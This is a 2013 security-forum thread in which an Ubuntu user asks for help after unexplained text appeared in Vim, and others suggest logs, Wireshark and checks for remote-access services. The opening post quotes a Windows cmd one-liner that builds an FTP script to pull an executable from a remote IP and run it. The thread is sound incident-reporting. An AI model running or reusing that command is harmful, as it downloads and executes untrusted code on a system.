---
title: "Was I hacked?  Someone trying to execute windows code on my machine"
date: 2013-08-03
forum: Security
---

### Post by imneal on 2013-08-03
Hello!

I run Ubuntu 12.04.2 LTS

I recently debugging some javascript.  I  had a terminal open with a tmux and a couple panes with vim, as well as a couple firefox windows. 

While in insert mode in Vim, this text began appearing where my cursor was: 
"
ystemroo\system32\cmd.exe                          
del eq&echo open 10.232.245.102 23415 >> eq&echo user 23941 25918 >> eq &echo get iexplore    r.exe >> eq &echo quit >> eq &ftp -n -s:eq &iexplorer.exe &del eq
"
                                                                          

I could take focus off the cursor   (the newline after cmd.exe was me).   It looks like someone got into my computer and was trying to open windows cmd terminal and send user information.   Somehow they got the stdin stream? Keyboard? 

Any idea how to track this down?

---

### Post by sandyd on 2013-08-03
moved to security discussions

---

### Post by Soul-Sing on 2013-08-03
I would wireshark it.

---

### Post by unspawn on 2013-08-03
> **imneal said:**
> Any idea how to track this down?
There's system and daemon logs, temp and home dir contents, user login records and shell history to check but the problem is you'd want to see volatile user, process and network details *at the time of the incident *and not way, way afterwards.
Say, you're not running any VNC-like services right?

---

### Post by imneal on 2013-08-03
No,  I'm not running any VNC, I'll keep wireshark up and running to see if it happens again. Hopefully I can track this down.  

Are there remote access logs any where?

---

### Post by imneal on 2013-08-03
Just as an FYI, I check my logs in /var/log, the only logs that were updatae around the time (11 am) were syslog, kernlog, auth.log, Xorg.0.log, and wtmp, none of which showed anything interesting.  

I'm going to keep wireshark up for a few days and hope that IP address pops up again.

---

### Post by 1clue on 2013-08-03
You might want to take additional precautions.  It's conceivable that an intruder would leave no trace, especially with a stock Ubuntu.

[https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)

---

### Post by CharlesA on 2013-08-03
> **unspawn said:**
> There's system and daemon logs, temp and home dir contents, user login records and shell history to check but the problem is you'd want to see volatile user, process and network details *at the time of the incident *and not way, way afterwards.
Say, you're not running any VNC-like services right?

Indeed.

I can't really think of any way someone could get into X without a VNC server or the like. Even SSH doesn't give you direct access to X.

It's possible a website allowed remote access, but without more investigation when the event occurred, there isn't much to do other than monitor the machine.

---

